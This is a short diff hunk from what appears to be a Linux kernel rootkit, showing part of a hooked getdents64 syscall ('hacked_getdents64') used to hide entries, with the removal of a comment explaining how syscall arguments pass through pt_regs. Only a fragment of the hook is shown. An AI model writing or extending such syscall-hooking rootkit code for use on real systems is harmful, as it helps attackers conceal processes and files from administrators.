@@ -140,21 +140,6 @@ static int is_invisible(pid_t pid)
 
 static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 {
-	/* Storing file descriptor
-	 * 
-	 * link: https://xcellerator.github.io/posts/linux_rootkits_02/
-	 *
-	 * paraphrasing:
-	 * Back in 2016, arguments were passed to the syscall exactly how it appears to be. 
-	 * If we were writing a hook for sys_read, we’d just have to imitate this function declaration ourselves 
-	 * and (once we’d put the hook in place), we’d be able to play with these arguments however we like.
-	 *
-	 * With (64-bit) kernel version 4.17.0, this changed. 
-	 * The arguments that are first stored in registers by the user are 
-	 * copied into a special struct called pt_regs, and then this is the 
-	 * only thing passed to the syscall. The syscall is then responsible 
-	 * for pulling the arguments it needs out of this struct.
-	 */
 	int fd = (int) pt_regs->di;
 
 	// Storing the name of the directory passed from user space via "si" register
